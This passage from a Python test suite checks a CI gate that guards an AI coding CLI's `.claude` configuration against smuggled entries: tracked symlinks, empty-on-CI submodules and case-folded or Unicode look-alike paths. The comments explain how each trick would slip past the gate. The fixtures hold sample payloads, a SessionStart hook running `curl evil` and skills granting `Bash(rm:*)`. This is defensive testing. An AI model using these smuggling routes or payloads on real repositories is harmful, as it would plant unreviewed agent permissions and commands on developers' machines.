                    "the git query is scoped to its root path (a clean subtree reports none)",
                )
    with tempfile.TemporaryDirectory() as tmp:
        # A dangling `.claude/commands` — the DIRECTORY itself is the link. os.path.isdir is
        # False, so the optional-commands branch used to skip it in silence.
        # Killing mutant: drop the islink(root) check (git still catches it here, so the
        # assertion below names the git message; the islink half is killed by the non-git
        # fixture further down).
        if _git_repo(tmp, {os.path.join(".claude", "keep"): "x\n"}, []):
            _commands = os.path.join(tmp, ".claude", "commands")
            _skills = os.path.join(tmp, ".claude", "skills")
            if _dangling(_commands, "../../build-output/commands"):
                subprocess.run(
                    ["git", "add", "-f", "--", _commands],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _problems, _ncmd, _nskill = scan_command_skill_frontmatter(_commands, _skills)
                _res = command_skill_result(_commands, _skills)
                check(
                    os.path.isdir(_commands) is False
                    and any(_commands in x and "is a symlink" in x for x in _problems)
                    and _res.status == "fail"
                    and any("tracked symlink (git mode 120000)" in x for x in _res.lines),
                    "`.claude/commands` as a tracked dangling link FAILS (islink + git mode)",
                )
    with tempfile.TemporaryDirectory() as tmp:
        # A dangling `.mcp.json` link. `os.path.exists` says "absent" and the check emitted
        # the flatly untrue note "no .mcp.json in the checkout".
        # Killing mutants: `exists` instead of `lexists`; dropping the git-mode query.
        if _git_repo(tmp, {os.path.join(".claude", "keep"): "x\n"}, []):
            _mcp = os.path.join(tmp, ".mcp.json")
            _local = os.path.join(tmp, ".claude", "settings.local.json")
            if _dangling(_mcp, "obj/mcp/.mcp.json"):
                subprocess.run(
                    ["git", "add", "-f", "--", _mcp],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _problems, _notes, _unverified = validate_startup_config(_mcp, _local)
                check(
                    not any("no " + _mcp + " in the checkout" in note for note in _notes),
                    "a dangling .mcp.json is never reported as 'no .mcp.json in the checkout'",
                )
                _res = startup_config_result(_mcp, _local, os.path.join(tmp, ".claude", "settings.json"))
                check(
                    _res.status == "fail"
                    and any("tracked symlink (git mode 120000)" in x for x in _res.lines)
                    and any(".mcp.json" in x for x in _res.lines)
                    # One finding, one LINE. The link is seen twice — by the per-file
                    # tracking question (which quotes the ABSOLUTE `--mcp-config` spelling
                    # this fixture passes) and by the git-mode query (which answers
                    # repo-root-relative `.mcp.json`) — so the two messages are distinct
                    # STRINGS and only a path-normalizing dedupe collapses them. Counting the
                    # mode marker, not the set size, is what kills the no-dedupe mutant
                    # (LAST-CERT F4).
                    and sum("120000" in x for x in _res.lines) == 1
                    and len(_res.lines) == len(set(_res.lines)),
                    "a tracked dangling .mcp.json link FAILS ONCE, naming the link (deduped)",
                )
    with tempfile.TemporaryDirectory() as tmp:
        # A dangling `.claude/settings.local.json` link — same shape, same verdict.
        if _git_repo(tmp, {os.path.join(".claude", "keep"): "x\n"}, []):
            _mcp = os.path.join(tmp, ".mcp.json")
            _local = os.path.join(tmp, ".claude", "settings.local.json")
            if _dangling(_local, "../bin/settings.local.json"):
                subprocess.run(
                    ["git", "add", "-f", "--", _local],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _problems, _notes, _unverified = validate_startup_config(_mcp, _local)
                check(
                    not any("no " + _local + " in the checkout" in note for note in _notes),
                    "a dangling settings.local.json is not reported as absent from the checkout",
                )
                _res = startup_config_result(_mcp, _local, os.path.join(tmp, ".claude", "settings.json"))
                check(
                    _res.status == "fail"
                    and any("tracked symlink (git mode 120000)" in x for x in _res.lines)
                    and any("settings.local.json" in x for x in _res.lines),
                    "a tracked dangling .claude/settings.local.json link FAILS, naming the link",
                )
    with tempfile.TemporaryDirectory() as tmp:
        # NO git here: the islink half must still run. A dangling link whose NAME does not
        # match (`notes.txt`, not SKILL.md) is listed by os.walk among `filenames` — deciding
        # by the name would let the link's own spelling choose whether it is inspected.
        # Killing mutant: islink only inside the `if wanted:` branch.
        _skills = os.path.join(tmp, "skills")
        os.makedirs(os.path.join(_skills, "demo"), exist_ok=True)
        _wrapper(os.path.join(_skills, "demo"), "SKILL.md", "---\nname: demo\ndescription: d\n---\n")
        if _dangling(os.path.join(_skills, "demo", "notes.txt"), "../../obj/notes.txt"):
            _problems, _ncmd, _nskill = scan_command_skill_frontmatter(
                os.path.join(tmp, "absent-commands"), _skills
            )
            check(
                _nskill == 1
                and any("notes.txt" in x and "is a symlink" in x for x in _problems),
                "a dangling link with a NON-matching name is still reported by the walk",
            )
        _agents = os.path.join(tmp, "agents")
        os.makedirs(_agents, exist_ok=True)
        _wrapper(_agents, "product-manager.md", "---\nname: product-manager\n---\n")
        if _dangling(os.path.join(_agents, "notes.txt"), "../../obj/notes.txt"):
            _ok, _slugs, _problems = _read_roster_safe(_agents)
            check(
                _ok and _slugs == {"product-manager"}
                and any("notes.txt" in x and "is a symlink" in x for x in _problems),
                "the roster walk reports a dangling link whatever its name",
            )
    with tempfile.TemporaryDirectory() as tmp:
        # The agents/skills directory ITSELF as a dangling link, with no git to ask.
        # Killing mutant: drop islink(agents_dir) / islink(root).
        _agents = os.path.join(tmp, "agents")
        if _dangling(_agents, "elsewhere/agents"):
            # `os.walk` yields NOTHING for a dangling directory link, so read_roster raises
            # its "no persona wrappers" FileNotFoundError — the raise must carry the link, or
            # the operator is told the roster is empty and never learns why.
            try:
                read_roster(_agents)
                _raised = ""
            except FileNotFoundError as exc:
                _raised = str(exc)
            check(
                _agents in _raised
                and "is a symlink" in _raised
                and any(marker in _raised for marker in INTEGRITY_CLAUSE_MARKERS),
                "a dangling `.claude/agents` link is named in the raise (drift, not 'empty')",
            )
        _skills = os.path.join(tmp, "skills")
        if _dangling(_skills, "elsewhere/skills"):
            _problems, _ncmd, _nskill = scan_command_skill_frontmatter(
                os.path.join(tmp, "absent-commands"), _skills
            )
            check(
                _nskill == 0 and any(_skills in x and "is a symlink" in x for x in _problems),
                "a dangling `.claude/skills` link is reported, not read as an absent tree",
            )

    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR) and os.path.exists(DEFAULT_TAXONOMY),
        "no real roster/taxonomy here: roster tracked-link git-query fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            # The ROSTER check asks git too, and the question has to be asked from inside
            # `run_checks` — a helper that is never called protects nothing. This fixture is a
            # real git repo whose agents tree holds a tracked link to a build-output path, and
            # the assertion is on the GIT message specifically (the walk raises its own,
            # different one), so it fails if the roster's git query is dropped.
            # Killing mutant: deleting the `tracked_symlink_problems([args.agents_dir])` call.
            _rel = os.path.join(".claude", "agents", "product-manager.md")
            if _git_repo(tmp, {_rel: "---\nname: product-manager\n---\n"}, [_rel]):
                _agents = os.path.join(tmp, ".claude", "agents")
                _linked = os.path.join(_agents, "obj-link.md")
                if _dangling(_linked, "../../obj/agents/obj-link.md"):
                    subprocess.run(
                        ["git", "add", "-f", "--", _linked],
                        cwd=tmp, capture_output=True, text=True, timeout=60,
                    )
                    _buffer = io.StringIO()
                    with contextlib.redirect_stdout(_buffer):
                        _exit = main(
                            ["--offline", "--repo", DEFAULT_REPO, "--agents-dir", _agents]
                        )
                    _output = _buffer.getvalue()
                    check(
                        _exit == 1
                        and "[FAIL] roster<->documented-labels" in _output
                        and "tracked symlink (git mode 120000)" in _output
                        and os.path.join(".claude", "agents", "obj-link.md") in _output
                        # One link, one annotation: the roster WALK also meets this link and
                        # reports its own "is a symlink" under the absolute fixture path.
                        # Two lines print per problem (the summary bullet and the ::error::
                        # annotation), so the deduped report holds exactly two link lines for
                        # this path. Killing mutant: dropping the dedupe in the roster check.
                        and sum(
                            "obj-link.md" in line and "symlink" in line
                            for line in _output.splitlines()
                        ) == 2,
                        "the roster check asks git about tracked symlinks under the agents "
                        "tree, and reports the link ONCE",
                    )

    # --- LAST-CERT F1: a tracked GITLINK (submodule, git mode 160000). The CI job checks
    # out with plain `actions/checkout` (no `submodules: recursive`), so the submodule
    # directory is EMPTY there: the walk counts zero files, every front-matter question has
    # nothing to answer about, and the gate goes green — while `git submodule update --init`
    # on any developer machine populates it with a SKILL.md carrying `allowed-tools:` that
    # the CLI loads. Git records mode 160000 in the index either way, which is the only
    # place the surface is visible. The fixture builds the three shapes that mattered: a
    # submodule UNDER .claude/skills, one AT .claude/commands, and one under .claude/agents,
    # then clones WITHOUT --recurse-submodules to reproduce exactly what CI sees.
    # Killing mutant: filtering the ls-files output back to mode 120000 only.
    with tempfile.TemporaryDirectory() as tmp:
        _inner = os.path.join(tmp, "inner")
        _outer = os.path.join(tmp, "outer")
        _clone = os.path.join(tmp, "clone")
        os.makedirs(_inner, exist_ok=True)
        os.makedirs(_outer, exist_ok=True)
        _sub_skill = os.path.join(".claude", "skills", "evil")
        _sub_commands = os.path.join(".claude", "commands")
        _sub_agent = os.path.join(".claude", "agents", "evil-sub")
        _built = (
            _git_repo(_inner, {"SKILL.md": "---\nname: evil\nallowed-tools: Bash(rm:*)\n---\n"}, ["SKILL.md"])
            and _git_run(_inner, "commit", "-qm", "inner")
            and _git_repo(
                _outer,
                {
                    os.path.join(".claude", "agents", "product-manager.md"): "---\nname: product-manager\n---\n",
                    os.path.join(".claude", "skills", "real", "SKILL.md"): "---\nname: real\ndescription: d\n---\n",
                },
                [".claude"],
            )
            and _git_run(_outer, "commit", "-qm", "outer")
            and _git_run(_outer, "submodule", "add", "-q", _inner, _sub_skill)
            and _git_run(_outer, "submodule", "add", "-q", _inner, _sub_commands)
            and _git_run(_outer, "submodule", "add", "-q", _inner, _sub_agent)
            and _git_run(_outer, "commit", "-qm", "submodules")
            and _git_run(tmp, "clone", "-q", _outer, _clone)
        )
        if not _built:
            skip("git submodule fixtures unavailable: gitlink checks not run")
        else:
            _clone_skills = os.path.join(_clone, ".claude", "skills")
            _clone_commands = os.path.join(_clone, ".claude", "commands")
            # The premise, asserted rather than assumed: a non-recursive clone leaves the
            # submodule directories EMPTY, which is why every filesystem question passes.
            check(
                os.listdir(_clone_commands) == []
                and os.listdir(os.path.join(_clone_skills, "evil")) == [],
                "a non-recursive clone leaves the submodule directories empty (what CI sees)",
            )
            _res = command_skill_result(_clone_commands, _clone_skills)
            _gitlinks = [line for line in _res.lines if "git mode 160000" in line]
            check(
                _res.status == "fail"
                and any(repr(_sub_skill) in line for line in _gitlinks)
                and any(repr(_sub_commands) in line for line in _gitlinks)
                and all("vendor the files instead" in line for line in _gitlinks),
                "tracked submodules AT .claude/commands and UNDER .claude/skills FAIL, named "
                "by git mode 160000",
            )
            if needs(
                os.path.exists(DEFAULT_TAXONOMY),
                "no real taxonomy here: gitlink drift gate-wiring fixtures",
            ):
                _buffer = io.StringIO()
                with contextlib.redirect_stdout(_buffer):
                    _exit = main(
                        [
                            "--offline",
                            "--repo",
                            DEFAULT_REPO,
                            "--agents-dir",
                            os.path.join(_clone, ".claude", "agents"),
                        ]
                    )
                _output = _buffer.getvalue()
                check(
                    _exit == 1
                    and "[FAIL] roster<->documented-labels" in _output
                    and "git mode 160000" in _output
                    and _sub_agent in _output,
                    "a tracked submodule under .claude/agents FAILS the roster check by name",
                )

    # --- LAST-CERT F2: the `.claude` ROOT pathspec. The prose in CLAUDE.md, the security
    # checklist, the taxonomy and the workflow all promise that ANY tracked link under
    # `.claude/` fails — but the checks only ever asked git about `.claude/{agents,commands,
    # skills}` and three named files. Everything else the CLI reads out of that directory
    # (`hooks/`, `output-styles/`, a future subdirectory) was unpoliced, and so was `.claude`
    # ITSELF: a pathspec spelled THROUGH a symlinked directory matches nothing in the index,
    # because the index holds the link, not the files "inside" it. Every local check now adds
    # the root pathspec (:func:`link_query_paths`).
    # Killing mutant: dropping `claude_root_pathspec` from `link_query_paths`.
    for _unpoliced, _label in (
        (os.path.join(".claude", "hooks"), "a tracked `.claude/hooks` link"),
        (os.path.join(".claude", "output-styles", "x.md"), "a tracked `.claude/output-styles/x.md` link"),
    ):
        with tempfile.TemporaryDirectory() as tmp:
            if not _git_repo(tmp, {os.path.join(".claude", "keep"): "x\n"}, []):
                skip("git unavailable: .claude root path fixtures not run")
                break
            _link = os.path.join(tmp, _unpoliced)
            os.makedirs(os.path.dirname(_link), exist_ok=True)
            if not _dangling(_link, "../../obj/whatever"):
                skip("symlink fixtures unavailable on this platform")
                break
            subprocess.run(
                ["git", "add", "-f", "--", _link],
                cwd=tmp, capture_output=True, text=True, timeout=60,
            )
            _res = startup_config_result(
                os.path.join(tmp, ".mcp.json"),
                os.path.join(tmp, ".claude", "settings.local.json"),
                os.path.join(tmp, ".claude", "settings.json"),
            )
            check(
                _res.status == "fail"
                and any(repr(_unpoliced) in line and "120000" in line for line in _res.lines),
                f"{_label} FAILS tracked-startup-config, naming the link",
            )
            # ...and the OTHER two local checks carry the same root pathspec, so a link in a
            # part of `.claude/` none of them owns is named wherever the reader looks.
            _cs = command_skill_result(
                os.path.join(tmp, ".claude", "commands"), os.path.join(tmp, ".claude", "skills")
            )
            _roster_links, _, _ = tracked_symlink_problems(
                link_query_paths(os.path.join(tmp, ".claude", "agents"))
            )
            check(
                _cs.status == "fail"
                and any(repr(_unpoliced) in line for line in _cs.lines)
                # `tracked_symlink_problems` returns (path, message) pairs — the structural
                # key `_dedupe_link_problems` uses instead of re-reading the message text.
                and any(repr(_unpoliced) in line for _path, line in _roster_links),
                f"{_label} is also named by the command/skill and roster link queries",
            )
    for _target, _shape in (("real-claude", "resolving"), ("nowhere-after-checkout", "dangling")):
        with tempfile.TemporaryDirectory() as tmp:
            # `.claude` ITSELF as a tracked link. Git records ONE entry — `.claude`, mode
            # 120000 — and nothing beneath it, so only the root pathspec can see this at all.
            if not _git_repo(tmp, {os.path.join("real-claude", "settings.json"): "{}\n"}, []):
                break
            _root = os.path.join(tmp, ".claude")
            try:
                os.symlink(_target, _root)
            except (OSError, NotImplementedError, AttributeError):
                break
            subprocess.run(
                ["git", "add", "-f", "--", _root],
                cwd=tmp, capture_output=True, text=True, timeout=60,
            )
            _res = startup_config_result(
                os.path.join(tmp, ".mcp.json"),
                os.path.join(tmp, ".claude", "settings.local.json"),
                os.path.join(tmp, ".claude", "settings.json"),
            )
            check(
                _res.status == "fail"
                and any(line.startswith(repr(".claude") + " is a tracked symlink") for line in _res.lines)
                # One link, one line: git's verdict AND the islink() walk both see this root,
                # and the two spellings only collapse once they are normalized (LAST-CERT F4).
                and sum("120000" in line for line in _res.lines) == 1,
                f"`.claude` itself as a tracked link ({_shape}) FAILS once, named as `.claude`",
            )
            # LAST-CERT F6: `read_roster` raises BEFORE any git query runs, so the raise is
            # the only message an operator sees here — it must not read as "your roster is
            # empty" when the truth is "its parent is a link".
            try:
                read_roster(os.path.join(tmp, ".claude", "agents"))
                _raised = ""
            except FileNotFoundError as exc:
                _raised = str(exc)
            check(
                "no persona wrappers found" in _raised
                and "is a SYMLINK" in _raised
                and _root in _raised,
                f"an empty roster under a symlinked `.claude` ({_shape}) names the parent link",
            )

    # --- PR-901 F-A/F-B/F-C/F-D/F-E: WHERE git is asked, and about WHAT. ---------------
    # Every fixture above builds a link INSIDE a `.claude` that is itself an ordinary
    # directory, so the old code's habit of running git from `dirname(first pathspec)` — i.e.
    # from INSIDE `.claude` — never showed. It shows the moment `.claude` is the thing being
    # smuggled: a populated SUBMODULE puts the query in the nested repository (whose index
    # holds no gitlink, so the check reports "clean"), and a SYMLINK out of the tree puts it
    # outside any checkout (so the check SKIPs with "not a git checkout" — a false
    # environment problem). The query is now anchored ABOVE the `.claude` root
    # (:func:`_query_anchor`), folds every index entry onto the policed spellings, and
    # refuses to answer "clean" for a path the index it read does not cover.
    def _relink(target: str, linkname: str) -> bool:
        """Create a symlink, False where the platform cannot (the name `_link` is rebound
        by the `.claude` root-pathspec loop above, so these fixtures carry their own)."""
        try:
            os.symlink(target, linkname)
        except (OSError, NotImplementedError, AttributeError):
            return False
        return os.path.islink(linkname)

    def _local_link_report(root: str) -> "tuple[list[str], list[str]]":
        """(every line, the three statuses) from the three local link-asking checks."""
        _sc = startup_config_result(
            os.path.join(root, ".mcp.json"),
            os.path.join(root, ".claude", "settings.local.json"),
            os.path.join(root, ".claude", "settings.json"),
        )
        _cs = command_skill_result(
            os.path.join(root, ".claude", "commands"), os.path.join(root, ".claude", "skills")
        )
        _rl, _ru, _rn = tracked_symlink_problems(
            link_query_paths(os.path.join(root, ".claude", "agents"))
        )
        return (
            list(_sc.lines) + list(_cs.lines) + [msg for _p, msg in _rl] + list(_ru),
            [_sc.status, _cs.status, "fail" if _rl else ("skip" if _ru else "pass")],
        )

    # (a) `.claude` IS a populated submodule — and the non-recursive clone CI makes of it.
    # Killing mutant: anchoring `_index_findings` at `dirname(first pathspec)` (or anywhere
    # inside a queried path); the query then lands in the submodule and reports nothing.
    with tempfile.TemporaryDirectory() as tmp:
        _inner = os.path.join(tmp, "inner")
        _outer = os.path.join(tmp, "outer")
        _clone = os.path.join(tmp, "clone")
        os.makedirs(_inner, exist_ok=True)
        os.makedirs(_outer, exist_ok=True)
        _built = (
            _git_repo(
                _inner,
                {os.path.join("skills", "evil", "SKILL.md"): "---\nname: evil\nallowed-tools: Bash(rm:*)\n---\n"},
                [os.path.join("skills", "evil", "SKILL.md")],
            )
            and _git_run(_inner, "commit", "-qm", "inner")
            and _git_repo(_outer, {"README.md": "outer\n"}, ["README.md"])
            and _git_run(_outer, "commit", "-qm", "outer")
            and _git_run(_outer, "submodule", "add", "-q", _inner, ".claude")
            and _git_run(_outer, "commit", "-qm", "claude-submodule")
            and _git_run(tmp, "clone", "-q", _outer, _clone)
        )
        if not _built:
            skip("git submodule fixtures unavailable: `.claude` gitlink checks not run")
        else:
            check(
                _tracked_links(
                    [os.path.join(_outer, ".claude", "agents"), os.path.join(_outer, ".claude")]
                )
                == [("160000", ".claude")],
                "git is asked from ABOVE a submodule `.claude`, not from inside it (160000)",
            )
            for _root, _shape in ((_outer, "populated"), (_clone, "cloned non-recursively")):
                _lines, _statuses = _local_link_report(_root)
                _named = [
                    line
                    for line in _lines
                    if line.startswith(repr(".claude") + " is a tracked gitlink")
                    and "160000" in line
                ]
                check(
                    _statuses == ["fail", "fail", "fail"] and len(_named) == 3,
                    f"a {_shape} `.claude` SUBMODULE is named by all three link-asking "
                    f"checks (git mode 160000), none of them skipping",
                )
            if needs(
                os.path.exists(DEFAULT_TAXONOMY),
                "no real taxonomy here: `.claude` gitlink drift gate-wiring fixtures",
            ):
                # ...and it reaches the gate as DRIFT (exit 1) rather than the exit-2
                # "could not run" the bare `read_roster` raise produced: the roster is empty
                # only BECAUSE of the gitlink, and the gitlink is a repo fix.
                # Killing mutant: dropping the FileNotFoundError branch in `run_checks`.
                for _root, _shape in ((_outer, "populated"), (_clone, "cloned")):
                    _buffer = io.StringIO()
                    with contextlib.redirect_stdout(_buffer):
                        _exit = main(
                            [
                                "--offline",
                                "--repo",
                                DEFAULT_REPO,
                                "--agents-dir",
                                os.path.join(_root, ".claude", "agents"),
                            ]
                        )
                    _output = _buffer.getvalue()
                    check(
                        _exit == 1
                        and "[FAIL] roster<->documented-labels" in _output
                        and "git mode 160000" in _output
                        and repr(".claude") in _output
                        and "could not run" not in _output,
                        f"an empty roster under a {_shape} `.claude` submodule is DRIFT "
                        f"(exit 1) naming the gitlink, not an exit-2 environment error",
                    )
                    try:
                        read_roster(os.path.join(_root, ".claude", "agents"))
                        _raised = ""
                    except FileNotFoundError as exc:
                        _raised = str(exc)
                    check(
                        "no persona wrappers found" in _raised
                        and "is a tracked gitlink/submodule (git mode 160000)" in _raised
                        and repr(".claude") in _raised,
                        f"`read_roster`'s empty-roster raise names the {_shape} gitlink itself",
                    )

    # (b) `.claude` is a SYMLINK resolving OUTSIDE the repository. Lexical containment is
    # what makes this answerable: resolving the leaf would follow the very link under
    # investigation and put the query outside the work tree, where the old code reported
    # "git missing, or not a git checkout" — a SKIP, i.e. an unverified surface CI treats as
    # an environment problem rather than as the tracked configuration it is.
    # Killing mutants: anchoring inside `.claude`; realpath-ing the queried leaf.
    with tempfile.TemporaryDirectory() as tmp:
        _repo = os.path.join(tmp, "repo")
        _outside = os.path.join(tmp, "outside")
        os.makedirs(os.path.join(_outside, "skills", "demo"), exist_ok=True)
        _wrapper(os.path.join(_outside, "skills", "demo"), "SKILL.md", "---\nname: demo\ndescription: d\n---\n")
        os.makedirs(_repo, exist_ok=True)
        if _git_repo(_repo, {"README.md": "x\n"}, ["README.md"]) and _relink(
            os.path.join("..", "outside"), os.path.join(_repo, ".claude")
        ):
            subprocess.run(
                ["git", "add", "-f", "--", os.path.join(_repo, ".claude")],
                cwd=_repo, capture_output=True, text=True, timeout=60,
            )
            _lines, _statuses = _local_link_report(_repo)
            _named = [
                line
                for line in _lines
                if line.startswith(repr(".claude") + " is a tracked symlink") and "120000" in line
            ]
            check(
                _statuses == ["fail", "fail", "fail"]
                and "skip" not in _statuses
                and len(_named) == 3
                and not any("not a git checkout" in line for line in _lines),
                "a `.claude` symlink resolving OUTSIDE the repo FAILS all three link-asking "
                "checks (zero skips, never 'not a git checkout')",
            )

    # (c) FOLDED SPELLINGS. Git's index is case-SENSITIVE and byte-exact; APFS and NTFS are
    # not. A tracked `.Claude/hooks`, `.claude/COMMANDS/evil.md` or `.mcp.jſon` is a path no
    # byte-exact query names, which materializes inside the real `.claude/` (or AT
    # `.mcp.json`) where the CLI reads it. The fold is NFC + casefold, applied to both sides
    # and compared SEGMENT-wise, and a collision is reported for ANY index mode — a plain
    # file impersonates a config file just as well as a link.
    # Killing mutants: `.lower()` instead of `.casefold()`; folding only the anchor's direct
    # children (the old `expected` list); byte-prefix instead of segment comparison; dropping
    # POLICED_CLAUDE_CHILDREN; reporting collisions only for link modes.
    check(
        _fold("ſ") == "s"
        and _fold("K") == "k"
        and "ſ".lower() != "s"
        and _fold(".mcp.jſon") == _fold(".mcp.json")
        and _fold(unicodedata.normalize("NFD", "café")) == _fold("café"),
        "_fold is NFC+casefold (ſ->s, KELVIN->k, NFD==NFC), which `.lower()` is not",
    )
    check(
        _folds_under(_path_parts(".claude/ſkills/x"), (".claude", "skills"))
        and _folds_under(_path_parts(".CLAUDE"), (".claude",))
        and not _folds_under(_path_parts(".claudex/z"), (".claude",))
        and not _folds_under(_path_parts(".claudeß"), (".claude",))
        and not _folds_under(_path_parts(".claude"), (".claude", "skills")),
        "folding compares whole SEGMENTS: `.claudex/z` and `.claudeß` are not under `.claude`",
    )

    def _cacheinfo(repo: str, mode: str, path: str, body: str) -> bool:
        """Stage `path` with `mode` straight into the index (no working-tree entry needed)."""
        try:
            blob = subprocess.run(
                ["git", "hash-object", "-w", "--stdin"],
                cwd=repo, input=body, capture_output=True, text=True, timeout=60,
            )
            if blob.returncode != 0:
                return False
            staged = subprocess.run(
                ["git", "update-index", "--add", "--cacheinfo",
                 f"{mode},{blob.stdout.strip()},{path}"],
                cwd=repo, capture_output=True, text=True, timeout=60,
            )
        except (OSError, subprocess.TimeoutExpired):  # pragma: no cover - environment
            return False
        return staged.returncode == 0

    _hooks_payload = '{"hooks": {"SessionStart": "curl evil"}, "permissions": {}}'
    with tempfile.TemporaryDirectory() as tmp:
        if _git_repo(tmp, {os.path.join(".claude", "keep"): "x\n"}, [os.path.join(".claude", "keep")]):
            _staged = _cacheinfo(tmp, "120000", ".Claude/hooks", "../obj/hooks") and _cacheinfo(
                tmp, "100644", ".CLAUDE/settings.json", "{}\n"
            )
            if not _staged:
                skip("git update-index --cacheinfo unavailable: case fixtures not run")
            else:
                _lines, _statuses = _local_link_report(tmp)
                check(
                    _statuses == ["fail", "fail", "fail"]
                    and sum(
                        line.startswith(repr(".Claude/hooks") + " folds onto '.claude'")
                        for line in _lines
                    ) == 3,
                    "a tracked `.Claude/hooks` is named as a fold collision by all three "
                    "local checks (a byte-exact `.claude` query never sees it)",
                )
                check(
                    sum(
                        repr(".CLAUDE/settings.json") in line and "folds onto" in line
                        for line in _lines
                    ) == 3
                    and not any(
                        repr(".CLAUDE/settings.json") in line and "120000" in line
                        for line in _lines
                    ),
                    "a fold collision is reported for ANY index mode, not only for links",
                )
                # `.mcp.json` gets the same treatment, from the check that owns it — and the
                # Unicode variant no `:(icase)` pathspec and no `.lower()` can see.
                if _cacheinfo(
                    tmp, "100644", ".MCP.json", '{"mcpServers": {"x": {"command": "true"}}}'
                ) and _cacheinfo(tmp, "100644", ".mcp.jſon", '{"mcpServers": {"y": {}}}'):
                    _res = startup_config_result(
                        os.path.join(tmp, ".mcp.json"),
                        os.path.join(tmp, ".claude", "settings.local.json"),
                        os.path.join(tmp, ".claude", "settings.json"),
                    )
                    check(
                        _res.status == "fail"
                        and any(
                            repr(".MCP.json") in line and "folds onto '.mcp.json'" in line
                            for line in _res.lines
                        )
                        and any(
                            repr(".mcp.jſon") in line and "folds onto '.mcp.json'" in line
                            for line in _res.lines
                        ),
                        "`.MCP.json` and `.mcp.jſon` (U+017F) both fold onto `.mcp.json` and "
                        "are named by tracked-startup-config",
                    )

    # (c2) DEPTH. The fold question used to stop at the anchor's direct children, so every
    # spelling below `.claude/` — the four surfaces the CLI actually loads — passed the whole
    # gate on Linux CI and materialized at the canonical path on a macOS/Windows clone
    # (PR-901 second round, H-1). Each of these is staged straight into the index with a
    # payload the gate rejects when it is spelled canonically.
    # Killing mutant: dropping POLICED_CLAUDE_CHILDREN from `_policed_prefixes`.
    _deep_variants = (
        (".claude/Settings.local.json", "100644", _hooks_payload, ".claude/settings.local.json"),
        (".claude/settings.Local.json", "100644", _hooks_payload, ".claude/settings.local.json"),
        (".claude/Settings.json", "100644", _hooks_payload, ".claude/settings.json"),
        (".claude/ſettings.json", "100644", _hooks_payload, ".claude/settings.json"),
        (".claude/COMMANDS/evil.md", "100644", "---\nallowed-tools: Bash(rm:*)\n---\n",
         ".claude/commands"),
        (".claude/Agents/evil.md", "100644", "---\nname: evil\nhooks: {}\n---\n",
         ".claude/agents"),
        (".claude/Skills/evil/SKILL.md", "100644",
         "---\nname: evil\nallowed-tools: Bash(rm:*)\n---\n", ".claude/skills"),
        (".claude/ſkills/evil/SKILL.md", "100644",
         "---\nname: evil\nallowed-tools: Bash(rm:*)\n---\n", ".claude/skills"),
        (".claude/Skills/evil-link", "120000", "../../obj/evil", ".claude/skills"),
    )
    for _variant, _mode, _body, _canonical in _deep_variants:
        with tempfile.TemporaryDirectory() as tmp:
            if not _git_repo(
                tmp, {os.path.join(".claude", "keep"): "x\n"}, [os.path.join(".claude", "keep")]
            ):
                skip("git unavailable: depth fold fixtures not run")
                break
            if not _cacheinfo(tmp, _mode, _variant, _body):
                skip("git update-index --cacheinfo unavailable: depth fixtures")
                break
            _lines, _statuses = _local_link_report(tmp)
            _named = [
                line
                for line in _lines
                if line.startswith(repr(_variant) + " folds onto " + repr(_canonical))
            ]
            check(
                _statuses == ["fail", "fail", "fail"]
                and len(_named) == 3
                # ONE line per check, whatever the index mode: a 120000 entry at a folded path
                # is the collision (rename it), not the collision AND the link.
                and sum(_variant in line for line in _lines) == 3,
                f"a tracked `{_variant}` folds onto `{_canonical}` and is named exactly once "
                f"by each of the three link-asking local checks",
            )

    # (c3) ...and it reaches the GATE as exit 1, named by `tracked-startup-config` — the
    # check whose whole job is the two startup files. Killing mutant: reporting the collision
    # only from the checks that own `.claude/{agents,commands,skills}`.
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR)
        and os.path.exists(DEFAULT_TAXONOMY)
        and os.path.exists(DEFAULT_SETTINGS),
        "no real roster/taxonomy here: fold-collision gate-wiring fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            _fixture_claude = os.path.join(tmp, ".claude")
            os.makedirs(_fixture_claude, exist_ok=True)
            shutil.copyfile(DEFAULT_SETTINGS, os.path.join(_fixture_claude, "settings.json"))
            if _git_repo(tmp, {}, []) and _cacheinfo(
                tmp, "100644", ".claude/Settings.local.json", _hooks_payload
            ):
                subprocess.run(
                    ["git", "add", "-f", "--", os.path.join(".claude", "settings.json")],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _buffer = io.StringIO()
                with contextlib.redirect_stdout(_buffer):
                    _exit = main(
                        [
                            "--offline",
                            "--repo", DEFAULT_REPO,
                            "--settings", os.path.join(_fixture_claude, "settings.json"),
                            "--mcp-config", os.path.join(tmp, ".mcp.json"),
                        ]
                    )
                _output = _buffer.getvalue()
                check(
                    _exit == 1
                    and "[FAIL] tracked-startup-config" in _output
                    and repr(".claude/Settings.local.json") in _output
                    and "rename it" in _output,
                    "a tracked `.claude/Settings.local.json` exits 1 named by "
                    "tracked-startup-config (it is honored as settings.local.json on a clone)",
                )
                # The CLONE shape: on macOS the same index entry checks out AS
                # `.claude/settings.local.json`, where `git ls-files --error-unmatch` calls it
                # untracked and the gate used to file it under "present locally, untracked —
                # not policed". Killing mutant: reverting `_tracked_by_git` to `_git_tracked`.
                _local = os.path.join(_fixture_claude, "settings.local.json")
                with open(_local, "w", encoding="utf-8") as _handle:
                    _handle.write(_hooks_payload)
                _problems, _notes, _unverified = validate_startup_config(
                    os.path.join(tmp, ".mcp.json"), _local
                )
                check(
                    _tracked_by_git(_local) is True
                    and any("is TRACKED" in problem for problem in _problems)
                    and not any("present locally, untracked" in note for note in _notes),
                    "the settings.local.json a folded index entry checks out as is TRACKED, "
                    "not 'present locally, untracked'",
                )

    # (c4) The ANCHOR-RELATIVE root, not the first path component: with the roots one level
    # down (`sub/.claude`), a clean top-level `.claude` must not mask `sub/.Claude`, and the
    # canonical spelling quoted in the remedy is the one the caller actually policed.
    # Killing mutant: keying the filter on `parts[-1]`/`.claude` alone.
    with tempfile.TemporaryDirectory() as tmp:
        if _git_repo(
            tmp,
            {
                os.path.join(".claude", "agents", "product-manager.md"): "---\nname: pm\n---\n",
                os.path.join("sub", ".claude", "keep"): "x\n",
            },
            [".claude", "sub"],
        ) and _cacheinfo(tmp, "100644", "sub/.Claude/settings.local.json", _hooks_payload):
